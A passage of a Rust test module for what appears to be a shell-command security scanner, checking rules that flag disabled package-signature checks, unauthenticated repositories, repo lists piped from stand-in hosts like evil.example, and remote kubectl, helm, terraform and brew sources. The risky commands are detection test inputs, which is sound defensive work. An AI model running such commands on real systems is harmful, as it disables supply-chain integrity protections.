                crate::extract::tier1_scan_for_shell(command, ScanContext::Exec, ShellType::Posix,),
                "zypper signature-disable flag must pass the tier-1 gate: {command}"
            );
        }
        assert!(!has(
            "zypper --no-gpg-checks=false install pkg",
            ShellType::Posix,
            RuleId::GpgCheckDisabled,
        ));
    }

    #[test]
    fn test_gpgcheck_zero_inline() {
        assert!(has(
            "echo 'gpgcheck=0' | sudo tee -a /etc/yum.repos.d/x.repo",
            ShellType::Posix,
            RuleId::GpgCheckDisabled,
        ));
    }

    #[test]
    fn test_gpgcheck_zero_word_boundary_across_occurrences() {
        // Regression: the boundary check uses absolute offsets, so a leading
        // non-boundary occurrence does not corrupt a later genuine one.
        assert!(raw_has_gpgcheck_zero("xgpgcheck=1 gpgcheck=0"));
        assert!(!raw_has_gpgcheck_zero("mygpgcheck=0"));
    }

    #[test]
    fn test_pacman_siglevel_never() {
        assert!(has(
            "echo 'SigLevel = Never' | sudo tee -a /etc/pacman.conf",
            ShellType::Posix,
            RuleId::GpgCheckDisabled,
        ));
    }

    #[test]
    fn test_dnf_install_plain_no_fire() {
        assert!(none("sudo dnf install httpd", ShellType::Posix));
    }

    #[test]
    fn test_gpgcheck_one_no_fire() {
        // gpgcheck=1 is the secure setting.
        assert!(!raw_has_gpgcheck_zero("gpgcheck=1"));
        assert!(!raw_has_gpgcheck_zero("repo_gpgcheck=0xff"));
    }

    #[test]
    fn test_gpgcheck_zero_spacing() {
        assert!(raw_has_gpgcheck_zero("gpgcheck = 0"));
        assert!(raw_has_gpgcheck_zero("GPGCHECK=0"));
    }

    // ── kubectl_apply_remote ────────────────────────────────────────────────

    #[test]
    fn test_kubectl_apply_raw_github() {
        assert!(has(
            "kubectl apply -f https://raw.githubusercontent.com/x/y/main/deploy.yaml",
            ShellType::Posix,
            RuleId::KubectlApplyRemote,
        ));
    }

    #[test]
    fn test_kubectl_apply_shortened_url() {
        assert!(has(
            "kubectl apply -f https://bit.ly/abc123",
            ShellType::Posix,
            RuleId::KubectlApplyRemote,
        ));
    }

    #[test]
    fn test_kubectl_apply_local_file_no_fire() {
        assert!(none("kubectl apply -f ./deploy.yaml", ShellType::Posix));
        assert!(none("kubectl apply -f manifests/", ShellType::Posix));
    }

    #[test]
    fn test_kubectl_apply_kustomize_dir_no_fire() {
        assert!(none("kubectl apply -k ./overlays/prod", ShellType::Posix));
    }

    #[test]
    fn test_kubectl_get_no_fire() {
        assert!(none("kubectl get pods -o yaml", ShellType::Posix));
    }

    #[test]
    fn test_kubectl_apply_filename_long_flag() {
        assert!(has(
            "kubectl apply --filename=https://raw.githubusercontent.com/x/y/m/d.yaml",
            ShellType::Posix,
            RuleId::KubectlApplyRemote,
        ));
    }

    #[test]
    fn test_kubectl_attached_and_repeated_filename_values() {
        for command in [
            "kubectl apply -fhttps://raw.githubusercontent.com/x/y/main/deploy.yaml",
            "kubectl apply -f=https://raw.githubusercontent.com/x/y/main/deploy.yaml",
            "kubectl apply -f ./base.yaml -fhttps://example.test/overlay.yaml",
            "kubectl apply -Rfhttps://example.test/overlay.yaml",
            "kubectl apply -f\"https://example.test/quoted.yaml\"",
            "kubectl apply --filename=\"https://example.test/quoted-long.yaml\"",
            "kubectl apply -f ./local.yaml,https://example.test/second.yaml",
            "kubectl -nprod apply --filename https://example.test/deploy.yaml",
            r#"C:\Tools\kubectl.exe apply -fhttps://example.test/deploy.yaml"#,
        ] {
            let shell = if command.starts_with("C:") {
                ShellType::Cmd
            } else {
                ShellType::Posix
            };
            assert!(
                has(command, shell, RuleId::KubectlApplyRemote),
                "kubectl attached/repeated filename form must be recognized: {command}"
            );
        }
    }

    #[test]
    fn test_kubectl_remote_kustomize_all_option_forms() {
        for command in [
            "kubectl apply -k https://github.com/acme/manifests//prod?ref=v1",
            "kubectl apply -khttps://github.com/acme/manifests//prod?ref=v1",
            "kubectl apply --kustomize=https://gitlab.com/acme/manifests/-/raw/main/prod",
            "kubectl --profile cpu apply -k github.com/acme/manifests//prod",
            "oc --context prod apply --kustomize github.com/acme/manifests//prod",
        ] {
            assert!(
                has(command, ShellType::Posix, RuleId::KubectlApplyRemote),
                "remote kustomize source must be recognized: {command}"
            );
            assert!(
                crate::extract::tier1_scan_for_shell(command, ScanContext::Exec, ShellType::Posix,),
                "remote kustomize source must pass the tier-1 gate: {command}"
            );
        }
        for command in [
            "kubectl apply -k ./overlays/prod",
            "kubectl apply --kustomize=../reviewed/prod",
            "kubectl apply -f -",
        ] {
            assert!(
                !has(command, ShellType::Posix, RuleId::KubectlApplyRemote),
                "local/stdin manifest source must remain clean: {command}"
            );
        }
    }

    #[test]
    fn test_kubectl_manifest_option_ambiguity_fails_conservatively() {
        for command in ["kubectl apply -f", "kubectl apply --filename="] {
            assert!(
                has(command, ShellType::Posix, RuleId::KubectlApplyRemote),
                "ambiguous manifest option must not return clean: {command}"
            );
        }
        assert!(!has(
            "kubectl get pods -fhttps://example.test/not-a-supported-get-flag",
            ShellType::Posix,
            RuleId::KubectlApplyRemote,
        ));
        assert!(!has(
            "kubectl apply -f --namespace",
            ShellType::Posix,
            RuleId::KubectlApplyRemote,
        ));
        assert!(!has(
            r#"kubectl apply --filename='"./local,comma.yaml"'"#,
            ShellType::Posix,
            RuleId::KubectlApplyRemote,
        ));
    }

    #[test]
    fn test_remediation_shapes_reach_the_rule_through_the_engine_gate() {
        for (command, rule) in [
            (
                "apt-get -o APT::Get::AllowUnauthenticated=true install pkg",
                RuleId::UnsignedRepoTrust,
            ),
            (
                "apt-get --allow-downgrades-to-insecure-repositories update",
                RuleId::UnsignedRepoTrust,
            ),
            (
                "zypper --no-gpg-checks install pkg",
                RuleId::GpgCheckDisabled,
            ),
            (
                "curl https://evil.example/r | sed s/x/y/ | doas tee /etc/apt/sources.list.d/x.list",
                RuleId::RepoAddFromPipe,
            ),
            (
                "wget --output-document=/etc/apt/sources.list https://evil.example/r",
                RuleId::RepoAddFromPipe,
            ),
            (
                "kubectl apply -fhttps://example.test/deploy.yaml",
                RuleId::KubectlApplyRemote,
            ),
            (
                "oc --context prod apply --kustomize github.com/acme/manifests//prod",
                RuleId::KubectlApplyRemote,
            ),
        ] {
            assert!(
                engine_has(command, ShellType::Posix, rule),
                "the public engine gate must reach {rule:?} for: {command}"
            );
        }
    }

    #[test]
    fn test_kubectl_global_namespace_flag_before_subcommand() {
        // CR6: a value-taking global flag before the subcommand must not have its
        // value mistaken for the subcommand; the real `apply` is still recognised.
        assert!(
            has(
                "kubectl --namespace prod apply -f \
                 https://raw.githubusercontent.com/x/y/main/deploy.yaml",
                ShellType::Posix,
                RuleId::KubectlApplyRemote,
            ),
            "a value-taking global flag before `apply` must not hide the subcommand"
        );
        // Short form `-n prod` likewise.
        assert!(has(
            "kubectl -n prod apply -f https://raw.githubusercontent.com/x/y/main/deploy.yaml",
            ShellType::Posix,
            RuleId::KubectlApplyRemote,
        ));
    }

    #[test]
    fn test_kubectl_global_flag_get_still_no_fire() {
        // Flag-skipping must not turn a non-mutating `get` into `apply`.
        assert!(none(
            "kubectl --namespace prod get pods -o yaml",
            ShellType::Posix,
        ));
    }

    // ── helm_untrusted_repo ─────────────────────────────────────────────────

    #[test]
    fn test_helm_repo_add_untrusted() {
        assert!(has(
            "helm repo add evil https://charts.evil.example.com",
            ShellType::Posix,
            RuleId::HelmUntrustedRepo,
        ));
    }

    #[test]
    fn test_helm_install_untrusted_repo_flag() {
        assert!(has(
            "helm install myapp mychart --repo https://charts.evil.example.com",
            ShellType::Posix,
            RuleId::HelmUntrustedRepo,
        ));
    }

    #[test]
    fn test_helm_repo_add_trusted_no_fire() {
        assert!(none(
            "helm repo add bitnami https://charts.bitnami.com/bitnami",
            ShellType::Posix,
        ));
    }

    #[test]
    fn test_helm_install_local_chart_no_fire() {
        assert!(none("helm install myapp ./mychart", ShellType::Posix));
    }

    #[test]
    fn test_helm_list_no_fire() {
        assert!(none("helm list -A", ShellType::Posix));
    }

    #[test]
    fn test_helm_global_kubeconfig_flag_before_subcommand() {
        // CR6: a value-taking helm global before `repo add` must not have its
        // value mistaken for the subcommand.
        assert!(
            has(
                "helm --kubeconfig /tmp/cfg repo add evil https://charts.evil.example.com",
                ShellType::Posix,
                RuleId::HelmUntrustedRepo,
            ),
            "a value-taking global flag before `repo add` must not hide the subcommand"
        );
        // Short `-n ns` likewise, with `install`.
        assert!(has(
            "helm -n prod install myapp mychart --repo https://charts.evil.example.com",
            ShellType::Posix,
            RuleId::HelmUntrustedRepo,
        ));
    }

    #[test]
    fn test_helm_pull_oci_untrusted_flagged() {
        // CR7: an `oci://` chart was not promoted to a remote URL on the exec
        // path, so this previously bypassed the detector.
        assert!(
            has(
                "helm pull oci://evil.example.com/charts/app",
                ShellType::Posix,
                RuleId::HelmUntrustedRepo,
            ),
            "a helm pull from an untrusted oci:// registry must fire"
        );
    }

    #[test]
    fn test_helm_install_oci_repo_flag_untrusted_flagged() {
        // CR7: `--repo oci://…` on the exec path must also be promoted.
        assert!(has(
            "helm install myapp mychart --repo oci://evil.example.com/charts",
            ShellType::Posix,
            RuleId::HelmUntrustedRepo,
        ));
    }

    #[test]
    fn test_helm_pull_oci_trusted_no_fire() {
        // repo-0325: ghcr.io is multi-tenant and no longer trusted by host
        // alone; registry.k8s.io (curated single-tenant) stays clean.
        assert!(
            none(
                "helm pull oci://registry.k8s.io/charts/app",
                ShellType::Posix,
            ),
            "an oci:// chart from a curated registry must stay clean"
        );
        // And the multi-tenant host now flags.
        assert!(has(
            "helm pull oci://ghcr.io/some-org/charts/app",
            ShellType::Posix,
            RuleId::HelmUntrustedRepo,
        ));
    }

    // ── terraform_remote_module ─────────────────────────────────────────────

    #[test]
    fn test_terraform_from_module_remote() {
        assert!(has(
            "terraform init -from-module=git::https://evil.example.com/m.git",
            ShellType::Posix,
            RuleId::TerraformRemoteModule,
        ));
    }

    #[test]
    fn test_terraform_from_module_github() {
        assert!(has(
            "terraform init -from-module github.com/evil/tf-module",
            ShellType::Posix,
            RuleId::TerraformRemoteModule,
        ));
    }

    #[test]
    fn test_terraform_from_module_local_no_fire() {
        assert!(none(
            "terraform init -from-module=./modules/vpc",
            ShellType::Posix,
        ));
    }

    #[test]
    fn test_terraform_init_plain_no_fire() {
        assert!(none("terraform init", ShellType::Posix));
        assert!(none("terraform apply -auto-approve", ShellType::Posix));
    }

    #[test]
    fn test_terraform_registry_shorthand_no_fire() {
        assert!(!is_untrusted_module_source("hashicorp/consul/aws"));
        assert!(!is_untrusted_module_source(
            "registry.terraform.io/hashicorp/vpc/aws"
        ));
    }

    // ── brew_untrusted_tap ──────────────────────────────────────────────────

    #[test]
    fn test_brew_install_url() {
        assert!(has(
            "brew install https://evil.example.com/x.rb",
            ShellType::Posix,
            RuleId::BrewUntrustedTap,
        ));
    }

    #[test]
    fn test_brew_tap_arbitrary_url() {
        assert!(has(
            "brew tap user/repo https://git.evil.example.com/homebrew-tap.git",
            ShellType::Posix,
            RuleId::BrewUntrustedTap,
        ));
    }

    #[test]
    fn test_brew_tap_ssh_github_url_no_fire() {
        // An SSH (SCP-syntax) GitHub tap URL is the normal case.
        assert!(none(
            "brew tap user/repo git@github.com:user/homebrew-tap.git",
            ShellType::Posix,
        ));
        // A non-GitHub SSH remote still fires.
        assert!(has(
            "brew tap user/repo git@evil.example.com:user/homebrew-tap.git",
            ShellType::Posix,
            RuleId::BrewUntrustedTap,
        ));
    }

    #[test]
    fn test_brew_install_plain_no_fire() {
        assert!(none("brew install ripgrep", ShellType::Posix));
        assert!(none("brew install --cask firefox", ShellType::Posix));
    }

    #[test]
    fn test_brew_tap_github_no_fire() {
        // A plain tap (implicit github.com) or an explicit github.com URL is fine.
        assert!(none("brew tap homebrew/cask-fonts", ShellType::Posix));
        assert!(none(
            "brew tap user/repo https://github.com/user/homebrew-repo",
            ShellType::Posix,
        ));
    }

    #[test]
    fn test_brew_tap_local_bare_repo_path_no_fire() {
        // CR8: a local bare-repo tap path ending in `.git` yields no host from
        // `git_remote_host`, so it is not reported as a remote tap.
        assert!(
            none(
                "brew tap acme/internal ../homebrew-tap.git",
                ShellType::Posix,
            ),
            "a local `.git` bare-repo tap path must not be flagged as a remote"
        );
        assert!(
            none(
                "brew tap acme/internal ./taps/homebrew-internal.git",
                ShellType::Posix,
            ),
            "a relative local `.git` tap path must not fire"
        );
        assert!(
            none(
                "brew tap acme/internal /srv/git/homebrew-internal.git",
                ShellType::Posix,
            ),
            "an absolute local `.git` tap path must not fire"
        );
    }

    // ── wrapper resolution ──────────────────────────────────────────────────

    #[test]
    fn test_doas_wrapper_resolved() {
        assert!(has(
            "doas dnf install --nogpgcheck pkg",
            ShellType::Posix,
            RuleId::GpgCheckDisabled,
        ));
    }

    #[test]
    fn test_env_wrapper_resolved() {
        // `env dnf …` must resolve through the `env` wrapper so the wrapped
        // command is recognized (mirrors `test_dnf_nogpgcheck` under sudo).
        assert!(has(
            "env dnf install --nogpgcheck pkg",
            ShellType::Posix,
            RuleId::GpgCheckDisabled,
        ));
        // Leading `VAR=val` assignments and env flags must be skipped too.
        assert!(has(
            "env FOO=1 dnf install --nogpgcheck pkg",
            ShellType::Posix,
            RuleId::GpgCheckDisabled,
        ));
    }

    #[test]
    fn test_command_wrapper_resolved() {
        // `command dnf …` must resolve through the `command` builtin wrapper.
        assert!(has(
            "command dnf install --nogpgcheck pkg",
            ShellType::Posix,
            RuleId::GpgCheckDisabled,
        ));
    }

    #[test]
    fn test_time_wrapper_resolved() {
        // F20: the shared resolver unwraps `time`, so the local resolver must
        // too — otherwise `time dnf …` hides the package manager behind `time`.
        assert!(
            has(
                "time dnf install --nogpgcheck pkg",
                ShellType::Posix,
                RuleId::GpgCheckDisabled,
            ),
            "a time-wrapped dnf must resolve so --nogpgcheck still fires"
        );
        // A value-taking `time` flag before the command must be skipped.
        assert!(has(
            "time -o /tmp/t dnf install --nogpgcheck pkg",
            ShellType::Posix,
            RuleId::GpgCheckDisabled,
        ));
        // Nested with sudo (`sudo time dnf …`) resolves through both wrappers.
        assert!(has(
            "sudo time dnf install --nogpgcheck pkg",
            ShellType::Posix,
            RuleId::GpgCheckDisabled,
        ));
    }

    #[test]
    fn test_tirith_wrapper_resolved() {
        // F20: the shared resolver unwraps `tirith` (any non-`run` subcommand
        // stays `tirith`, so the wrapped command is NOT reached) — but it must
        // still resolve in lockstep so the local set matches. `tirith run dnf …`
        // is a sink and does not unwrap further; neither shape should now panic
        // or diverge from the shared resolver. The realistic exec-wrapper case
        // is `time`/`env`/`command`; `tirith` is included only for set parity.
        // A bare `tirith` with a non-run subcommand must not be misread as dnf.
        assert!(none("tirith check dnf install pkg", ShellType::Posix));
    }

    #[test]
    fn test_sudo_u_flag_resolved() {
        assert!(has(
            "sudo -u root apt-get install --allow-unauthenticated pkg",
            ShellType::Posix,
            RuleId::UnsignedRepoTrust,
        ));
    }

    #[test]
    fn test_url_host_parsing() {
        assert_eq!(
            url_host("https://user:pw@charts.example.com:8443/path"),
            Some("charts.example.com".to_string())
        );
        assert_eq!(
            url_host("https://raw.githubusercontent.com/x/y"),
            Some("raw.githubusercontent.com".to_string())
        );
    }

    #[test]
    fn test_quoted_args() {
        // Quoting must not defeat detection.
        assert!(has(
            r#"sudo apt-get install "--allow-unauthenticated" pkg"#,
            ShellType::Posix,
            RuleId::UnsignedRepoTrust,
        ));
    }
}
